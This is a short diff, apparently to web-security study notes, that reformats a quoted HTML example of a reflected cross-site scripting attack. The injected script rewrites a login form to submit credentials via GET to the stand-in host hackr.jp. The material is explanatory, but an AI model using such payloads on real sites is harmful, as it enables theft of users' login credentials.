@@ -251,7 +251,7 @@ http://example.jp/login?ID="><script>var+f=document.getElementById("login");+f.a
 > &lt;form action=&quot;http://example.jp/login&quot; method=&quot;post&quot; id=&quot;login&quot;&gt;  
 > 	&lt;div class=&quot;input_id&quot;&gt;  
 > 		ID  
-> 		&lt;input type=&quot;text&quot; name=&quot;ID&quot; value=&quot;&quot;&gt;&lt;script&gt;var f=document.getElementById(&quot;login&quot;);    f.action=&quot;http://hackr.jp/pwget&quot;; f.method=&quot;get&quot;;&lt;/script&gt;&lt;span s=&quot; /&gt;  
+> 		&lt;input type=&quot;text&quot; name=&quot;ID&quot; value=&quot;&quot;&gt;&lt;script&gt;var f=document.getElementById(&quot;login&quot;);f.action=&quot;http://hackr.jp/pwget&quot;; f.method=&quot;get&quot;;&lt;/script&gt;&lt;span s=&quot; /&gt;  
 > 	&lt;/div&gt;  
 > &lt;/form&gt;  
 > &lt;/div>    
